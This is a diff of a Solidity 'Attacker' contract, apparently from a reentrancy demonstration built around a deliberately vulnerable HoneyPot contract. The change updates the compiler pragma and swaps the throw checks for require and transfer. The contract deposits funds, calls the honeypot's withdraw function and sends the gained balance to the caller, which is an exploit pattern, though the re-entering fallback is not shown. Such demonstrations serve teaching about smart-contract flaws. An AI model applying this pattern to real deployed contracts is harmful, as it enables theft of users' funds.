@@ -1,4 +1,4 @@
-pragma solidity ^0.4.8;
+pragma solidity 0.4.13;
 
 import "./HoneyPot.sol";
 
@@ -7,12 +7,8 @@ contract Attacker {
         uint before = this.balance;
         HoneyPot(honeyPot).put.value(msg.value)();
         HoneyPot(honeyPot).get();
-        if (this.balance <= before) {
-            throw;
-        }
-        if (!msg.sender.send(this.balance)) {
-            throw;
-        }
+        require(this.balance > before);
+        msg.sender.transfer(this.balance);
     }
 
     function() payable {
